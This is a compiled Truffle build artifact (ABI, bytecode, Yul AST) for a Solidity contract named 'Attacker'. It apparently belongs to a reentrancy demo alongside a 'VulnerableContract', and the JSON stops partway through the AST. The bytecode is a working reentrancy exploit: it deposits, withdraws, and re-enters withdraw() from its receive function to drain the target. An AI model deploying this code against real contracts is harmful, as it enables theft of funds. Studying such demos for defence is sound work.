{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_vulnerableAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "drainedAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "prevBalanceVulnerableContract",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "targetAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "totalWithdraw",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "vulnerable",
      "outputs": [
        {
          "internalType": "contract VulnerableContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_targetAmount",
          "type": "uint256"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    }
  ],
  "metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_vulnerableAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_targetAmount\",\"type\":\"uint256\"}],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"drainedAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"prevBalanceVulnerableContract\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"targetAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWithdraw\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vulnerable\",\"outputs\":[{\"internalType\":\"contract VulnerableContract\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawFunds\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"project:/contracts/Attacker.sol\":\"Attacker\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"project:/contracts/Attacker.sol\":{\"keccak256\":\"0x5b0ea77069ae469f8e74c9da06515c4721ba4f9fb6673240a19e88179198ef05\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5449337737a394879c592a3827b135f6f44244de265fe03c521ab904d596d832\",\"dweb:/ipfs/QmWeZmjhzDqhjV3XxpFbE1v9Fx1jviG2cGkHuF8ztqA1fC\"]},\"project:/contracts/VulnerableContract.sol\":{\"keccak256\":\"0x530f2d8c8b2d5d7283a40558664d1a1e4b17ad202e984695b8a2876f2669bdd8\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://615f3801ef4f7b1724833270a7c1607e27035a57a37297b8b4a52bf7bd55807e\",\"dweb:/ipfs/QmTZTsLSruDmxFM52SctoVYxJNv3hjkVEsSUKWbXVGewST\"]}},\"version\":1}",
  "bytecode": "0x608060405260035460055534801561001657600080fd5b50604051610b43380380610b43833981810160405281019061003891906100d4565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610146565b6000815190506100ce8161012f565b92915050565b6000602082840312156100e657600080fd5b60006100f4848285016100bf565b91505092915050565b60006101088261010f565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610138816100fd565b811461014357600080fd5b50565b6109ee806101556000396000f3fe60806040526004361061008a5760003560e01c8063846700621161005957806384670062146102595780638da5cb5b14610284578063953b8fb8146102af578063d0e30db0146102da578063f66ad59a146102e4576101cb565b80630f5ea827146101d057806324600fc3146101fb578063455fd6231461021257806364dd891a1461023d576101cb565b366101cb5760008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163190506002546005541080156100e157508060045410155b156101c8578060055411156100f857806005819055505b6003546005600082825461010c9190610888565b925050819055506003546004600082825461012791906108de565b92505081905550600060035411156101c75760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6003546040518263ffffffff1660e01b8152600401610194919061085c565b600060405180830381600087803b1580156101ae57600080fd5b505af11580156101c2573d6000803e3d6000fd5b505050505b5b50005b600080fd5b3480156101dc57600080fd5b506101e561030f565b6040516101f2919061085c565b60405180910390f35b34801561020757600080fd5b50610210610315565b005b34801561021e57600080fd5b50610227610410565b604051610234919061085c565b60405180910390f35b61025760048036038101906102529190610664565b610416565b005b34801561026557600080fd5b5061026e6105f7565b60405161027b919061085c565b60405180910390f35b34801561029057600080fd5b506102996105fd565b6040516102a691906107c6565b60405180910390f35b3480156102bb57600080fd5b506102c4610623565b6040516102d1919061085c565b60405180910390f35b6102e2610629565b005b3480156102f057600080fd5b506102f961062b565b60405161030691906107e1565b60405180910390f35b60035481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146103a5576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161039c906107fc565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561040d573d6000803e3d6000fd5b50565b60055481565b60003411610459576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104509061081c565b60405180910390fd5b6000811161049c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104939061083c565b60405180910390fd5b806002819055503460038190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561051257600080fd5b505af1158015610526573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163160048190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b81526004016105c2919061085c565b600060405180830381600087803b1580156105dc57600080fd5b505af11580156105f0573d6000803e3d6000fd5b5050505050565b60045481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008135905061065e816109a1565b92915050565b60006020828403121561067657600080fd5b60006106848482850161064f565b91505092915050565b61069681610912565b82525050565b6106a58161094e565b82525050565b60006106b8601783610877565b91507f4f6e6c79206f776e65722063616e2077697468647261770000000000000000006000830152602082019050919050565b60006106f8602183610877565b91507f4e65656420746f2073656e6420736f6d6520457468657220746f20617474616360008301527f6b000000000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b600061075e602483610877565b91507f54617267657420616d6f756e74206d757374206265206772656174657220746860008301527f616e2030000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b6107c081610944565b82525050565b60006020820190506107db600083018461068d565b92915050565b60006020820190506107f6600083018461069c565b92915050565b60006020820190508181036000830152610815816106ab565b9050919050565b60006020820190508181036000830152610835816106eb565b9050919050565b6000602082019050818103600083015261085581610751565b9050919050565b600060208201905061087160008301846107b7565b92915050565b600082825260208201905092915050565b600061089382610944565b915061089e83610944565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156108d3576108d2610972565b5b828201905092915050565b60006108e982610944565b91506108f483610944565b92508282101561090757610906610972565b5b828203905092915050565b600061091d82610924565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061095982610960565b9050919050565b600061096b82610924565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6109aa81610944565b81146109b557600080fd5b5056fea264697066735822122019c425ea3f30aacf2f6674f2d527742160b18fbb2e03204085c6ee99995503a264736f6c63430008000033",
  "deployedBytecode": "0x60806040526004361061008a5760003560e01c8063846700621161005957806384670062146102595780638da5cb5b14610284578063953b8fb8146102af578063d0e30db0146102da578063f66ad59a146102e4576101cb565b80630f5ea827146101d057806324600fc3146101fb578063455fd6231461021257806364dd891a1461023d576101cb565b366101cb5760008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163190506002546005541080156100e157508060045410155b156101c8578060055411156100f857806005819055505b6003546005600082825461010c9190610888565b925050819055506003546004600082825461012791906108de565b92505081905550600060035411156101c75760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6003546040518263ffffffff1660e01b8152600401610194919061085c565b600060405180830381600087803b1580156101ae57600080fd5b505af11580156101c2573d6000803e3d6000fd5b505050505b5b50005b600080fd5b3480156101dc57600080fd5b506101e561030f565b6040516101f2919061085c565b60405180910390f35b34801561020757600080fd5b50610210610315565b005b34801561021e57600080fd5b50610227610410565b604051610234919061085c565b60405180910390f35b61025760048036038101906102529190610664565b610416565b005b34801561026557600080fd5b5061026e6105f7565b60405161027b919061085c565b60405180910390f35b34801561029057600080fd5b506102996105fd565b6040516102a691906107c6565b60405180910390f35b3480156102bb57600080fd5b506102c4610623565b6040516102d1919061085c565b60405180910390f35b6102e2610629565b005b3480156102f057600080fd5b506102f961062b565b60405161030691906107e1565b60405180910390f35b60035481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146103a5576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161039c906107fc565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561040d573d6000803e3d6000fd5b50565b60055481565b60003411610459576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104509061081c565b60405180910390fd5b6000811161049c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104939061083c565b60405180910390fd5b806002819055503460038190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561051257600080fd5b505af1158015610526573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163160048190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b81526004016105c2919061085c565b600060405180830381600087803b1580156105dc57600080fd5b505af11580156105f0573d6000803e3d6000fd5b5050505050565b60045481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008135905061065e816109a1565b92915050565b60006020828403121561067657600080fd5b60006106848482850161064f565b91505092915050565b61069681610912565b82525050565b6106a58161094e565b82525050565b60006106b8601783610877565b91507f4f6e6c79206f776e65722063616e2077697468647261770000000000000000006000830152602082019050919050565b60006106f8602183610877565b91507f4e65656420746f2073656e6420736f6d6520457468657220746f20617474616360008301527f6b000000000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b600061075e602483610877565b91507f54617267657420616d6f756e74206d757374206265206772656174657220746860008301527f616e2030000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b6107c081610944565b82525050565b60006020820190506107db600083018461068d565b92915050565b60006020820190506107f6600083018461069c565b92915050565b60006020820190508181036000830152610815816106ab565b9050919050565b60006020820190508181036000830152610835816106eb565b9050919050565b6000602082019050818103600083015261085581610751565b9050919050565b600060208201905061087160008301846107b7565b92915050565b600082825260208201905092915050565b600061089382610944565b915061089e83610944565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156108d3576108d2610972565b5b828201905092915050565b60006108e982610944565b91506108f483610944565b92508282101561090757610906610972565b5b828203905092915050565b600061091d82610924565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061095982610960565b9050919050565b600061096b82610924565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6109aa81610944565b81146109b557600080fd5b5056fea264697066735822122019c425ea3f30aacf2f6674f2d527742160b18fbb2e03204085c6ee99995503a264736f6c63430008000033",
  "immutableReferences": {},
  "generatedSources": [
    {
      "ast": {
        "nodeType": "YulBlock",
        "src": "0:861:2",
        "statements": [
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "78:88:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "88:22:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "offset",
                        "nodeType": "YulIdentifier",
                        "src": "103:6:2"
                      }
                    ],
                    "functionName": {
                      "name": "mload",
                      "nodeType": "YulIdentifier",
                      "src": "97:5:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "97:13:2"
                  },
                  "variableNames": [
                    {
                      "name": "value",
                      "nodeType": "YulIdentifier",
                      "src": "88:5:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "154:5:2"
                      }
                    ],
                    "functionName": {
                      "name": "validator_revert_t_address_payable",
                      "nodeType": "YulIdentifier",
                      "src": "119:34:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "119:41:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "119:41:2"
                }
              ]
            },
            "name": "abi_decode_t_address_payable_fromMemory",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "offset",
                "nodeType": "YulTypedName",
                "src": "56:6:2",
                "type": ""
              },
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "64:3:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "72:5:2",
                "type": ""
              }
            ],
            "src": "7:159:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "257:215:2",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "303:16:2",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "312:1:2",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "315:1:2",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "305:6:2"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "305:12:2"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "305:12:2"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "278:7:2"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "287:9:2"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "274:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "274:23:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "299:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "slt",
                      "nodeType": "YulIdentifier",
                      "src": "270:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "270:32:2"
                  },
                  "nodeType": "YulIf",
                  "src": "267:2:2"
                },
                {
                  "nodeType": "YulBlock",
                  "src": "329:136:2",
                  "statements": [
                    {
                      "nodeType": "YulVariableDeclaration",
                      "src": "344:15:2",
                      "value": {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "358:1:2",
                        "type": "",
                        "value": "0"
                      },
                      "variables": [
                        {
                          "name": "offset",
                          "nodeType": "YulTypedName",
                          "src": "348:6:2",
                          "type": ""
                        }
                      ]
                    },
                    {
                      "nodeType": "YulAssignment",
                      "src": "373:82:2",
                      "value": {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "name": "headStart",
                                "nodeType": "YulIdentifier",
                                "src": "427:9:2"
                              },
                              {
                                "name": "offset",
                                "nodeType": "YulIdentifier",
                                "src": "438:6:2"
                              }
                            ],
                            "functionName": {
                              "name": "add",
                              "nodeType": "YulIdentifier",
                              "src": "423:3:2"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "423:22:2"
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "447:7:2"
                          }
                        ],
                        "functionName": {
                          "name": "abi_decode_t_address_payable_fromMemory",
                          "nodeType": "YulIdentifier",
                          "src": "383:39:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "383:72:2"
                      },
                      "variableNames": [
                        {
                          "name": "value0",
                          "nodeType": "YulIdentifier",
                          "src": "373:6:2"
                        }
                      ]
                    }
                  ]
                }
              ]
            },
            "name": "abi_decode_tuple_t_address_payable_fromMemory",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "227:9:2",
                "type": ""
              },
              {
                "name": "dataEnd",
                "nodeType": "YulTypedName",
                "src": "238:7:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "250:6:2",
                "type": ""
              }
            ],
            "src": "172:300:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "531:51:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "541:35:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "570:5:2"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "552:17:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "552:24:2"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "541:7:2"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_address_payable",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "513:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "523:7:2",
                "type": ""
              }
            ],
            "src": "478:104:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "633:81:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "643:65:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "658:5:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "665:42:2",
                        "type": "",
                        "value": "0xffffffffffffffffffffffffffffffffffffffff"
                      }
                    ],
                    "functionName": {
                      "name": "and",
                      "nodeType": "YulIdentifier",
                      "src": "654:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "654:54:2"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "643:7:2"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "615:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "625:7:2",
                "type": ""
              }
            ],
            "src": "588:126:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "771:87:2",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "836:16:2",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "845:1:2",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "848:1:2",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "838:6:2"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "838:12:2"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "838:12:2"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "794:5:2"
                          },
                          {
                            "arguments": [
                              {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "827:5:2"
                              }
                            ],
                            "functionName": {
                              "name": "cleanup_t_address_payable",
                              "nodeType": "YulIdentifier",
                              "src": "801:25:2"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "801:32:2"
                          }
                        ],
                        "functionName": {
                          "name": "eq",
                          "nodeType": "YulIdentifier",
                          "src": "791:2:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "791:43:2"
                      }
                    ],
                    "functionName": {
                      "name": "iszero",
                      "nodeType": "YulIdentifier",
                      "src": "784:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "784:51:2"
                  },
                  "nodeType": "YulIf",
                  "src": "781:2:2"
                }
              ]
            },
            "name": "validator_revert_t_address_payable",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "764:5:2",
                "type": ""
              }
            ],
            "src": "720:138:2"
          }
        ]
      },
      "contents": "{\n\n    function abi_decode_t_address_payable_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address_payable(value)\n    }\n\n    function abi_decode_tuple_t_address_payable_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_payable_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_address_payable(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function validator_revert_t_address_payable(value) {\n        if iszero(eq(value, cleanup_t_address_payable(value))) { revert(0, 0) }\n    }\n\n}\n",
      "id": 2,
      "language": "Yul",
      "name": "#utility.yul"
    }
  ],
  "deployedGeneratedSources": [
    {
      "ast": {
        "nodeType": "YulBlock",
        "src": "0:5620:2",
        "statements": [
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "59:87:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "69:29:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "offset",
                        "nodeType": "YulIdentifier",
                        "src": "91:6:2"
                      }
                    ],
                    "functionName": {
                      "name": "calldataload",
                      "nodeType": "YulIdentifier",
                      "src": "78:12:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "78:20:2"
                  },
                  "variableNames": [
                    {
                      "name": "value",
                      "nodeType": "YulIdentifier",
                      "src": "69:5:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "134:5:2"
                      }
                    ],
                    "functionName": {
                      "name": "validator_revert_t_uint256",
                      "nodeType": "YulIdentifier",
                      "src": "107:26:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "107:33:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "107:33:2"
                }
              ]
            },
            "name": "abi_decode_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "offset",
                "nodeType": "YulTypedName",
                "src": "37:6:2",
                "type": ""
              },
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "45:3:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "53:5:2",
                "type": ""
              }
            ],
            "src": "7:139:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "218:196:2",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "264:16:2",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "273:1:2",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "276:1:2",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "266:6:2"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "266:12:2"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "266:12:2"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "239:7:2"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "248:9:2"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "235:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "235:23:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "260:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "slt",
                      "nodeType": "YulIdentifier",
                      "src": "231:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "231:32:2"
                  },
                  "nodeType": "YulIf",
                  "src": "228:2:2"
                },
                {
                  "nodeType": "YulBlock",
                  "src": "290:117:2",
                  "statements": [
                    {
                      "nodeType": "YulVariableDeclaration",
                      "src": "305:15:2",
                      "value": {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "319:1:2",
                        "type": "",
                        "value": "0"
                      },
                      "variables": [
                        {
                          "name": "offset",
                          "nodeType": "YulTypedName",
                          "src": "309:6:2",
                          "type": ""
                        }
                      ]
                    },
                    {
                      "nodeType": "YulAssignment",
                      "src": "334:63:2",
                      "value": {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "name": "headStart",
                                "nodeType": "YulIdentifier",
                                "src": "369:9:2"
                              },
                              {
                                "name": "offset",
                                "nodeType": "YulIdentifier",
                                "src": "380:6:2"
                              }
                            ],
                            "functionName": {
                              "name": "add",
                              "nodeType": "YulIdentifier",
                              "src": "365:3:2"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "365:22:2"
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "389:7:2"
                          }
                        ],
                        "functionName": {
                          "name": "abi_decode_t_uint256",
                          "nodeType": "YulIdentifier",
                          "src": "344:20:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "344:53:2"
                      },
                      "variableNames": [
                        {
                          "name": "value0",
                          "nodeType": "YulIdentifier",
                          "src": "334:6:2"
                        }
                      ]
                    }
                  ]
                }
              ]
            },
            "name": "abi_decode_tuple_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "188:9:2",
                "type": ""
              },
              {
                "name": "dataEnd",
                "nodeType": "YulTypedName",
                "src": "199:7:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value0",
